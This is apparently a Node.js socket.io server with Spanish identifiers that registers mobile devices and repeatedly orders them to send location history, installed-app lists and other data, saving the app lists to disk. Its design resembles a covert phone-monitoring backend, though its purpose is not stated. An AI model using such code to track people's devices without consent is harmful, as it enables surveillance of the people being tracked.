'use strict';

const socketIO = require('socket.io');
const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');

class SocketPeticiones {
  constructor() {
    const app = express();
    this.httpServer = http.createServer(app);
    this.io = socketIO(this.httpServer, { cors: { origin: "*" } });
    this.devices = new Map();

    this.httpServer.listen(8070, () => {
      console.log('SocketPeticiones escuchando en puerto 8070');
    });
  }

  startSocket() {
    this.io.on('connection', (socket) => {
      console.log('✅ Nueva conexión de dispositivo:', socket.id);

      socket.on('register_device', (data) => {
        const key = `${data.cuenta}_${data.usuario}`;

        if (this.devices.has(key)) {
          const oldSocket = this.devices.get(key);
          try { oldSocket.disconnect(true); } catch (e) {}
        }

        this.devices.set(key, socket);
        socket.deviceKey = key;

        console.log(`\n📱 DISPOSITIVO REGISTRADO:`);
        console.log(`   Cuenta: ${data.cuenta}`);
        console.log(`   Usuario: ${data.usuario}`);
        console.log(`   Total dispositivos: ${this.devices.size}`);

        setTimeout(() => {
          if (socket.connected) {
            console.log('\nPrimera solicitud automática: request_all_data');
            socket.emit('request_all_data', {});
          }
        }, 5000);

        const interval = setInterval(() => {
          if (this.devices.has(key) && socket.connected) {
            const solicitudes = [
              'request_location_history',
              'request_installed_apps',
              'request_upload_queue',
              'request_all_data'
            ];
            const solicitud = solicitudes[Math.floor(Math.random() * solicitudes.length)];
            console.log(`\nAuto-solicitando: ${solicitud}`);
            socket.emit(solicitud, { limit: 10 });
          }
        }, 20000);

        const safetyTimeout = setTimeout(() => clearInterval(interval), 5 * 60 * 1000);

        socket.on('disconnect', () => {
          clearInterval(interval);
          clearTimeout(safetyTimeout);
          if (socket.deviceKey) {
            this.devices.delete(socket.deviceKey);
            console.log(`Dispositivo desconectado: ${socket.deviceKey}`);
          }
        });
      });

      socket.on('installed_apps_response', (data) => {
        console.log(`\nAPPS RECIBIDAS: ${data.count}`);

        try {
          const dir = path.join(__dirname, 'apps_logs');
          if (!fs.existsSync(dir)) fs.mkdirSync(dir);
          const filename = path.join(dir, `apps_${new Date().toISOString().slice(0,16).replace(/:/g,'-')}.json`);
          fs.writeFileSync(filename, JSON.stringify(data));
          console.log(`💾 Apps guardadas en: ${filename}`);
        } catch (err) {
          console.error('Error guardando apps:', err.message);
        }

        if (data.data && data.data.length > 0) {
          console.log('\nPrimeras apps recibidas:');
          data.data.slice(0, 5).forEach(app => {
            console.log(`  - ${app.appName || app.packageName} (v${app.version})`);
          });
        }
      });

      socket.on('upload_queue_response', (data) => {
        console.log('Cola uploads recibida:', data.pending_count);
      });

      socket.on('device_telemetry_response', (data) => {
        console.log('Telemetría recibida:', JSON.stringify(data).substring(0,200), '...');
      });

      socket.on('all_data_complete', () => {
        console.log('Todos los datos recibidos');
      });
    });
  }

  solicitarDatos(cuenta, usuario, tipoSolicitud, payload = {}) {
    const key = `${cuenta}_${usuario}`;
    const device = this.devices.get(key);

    if (device) {
      device.emit(tipoSolicitud, payload);
      console.log(`Enviada solicitud ${tipoSolicitud} a ${key}`);
      return true;
    } else {
      console.error(`Dispositivo ${key} no conectado`);
      return false;
    }
  }

  getDispositivos() {
    return Array.from(this.devices.keys());
  }
}

module.exports.SocketPeticiones = SocketPeticiones;
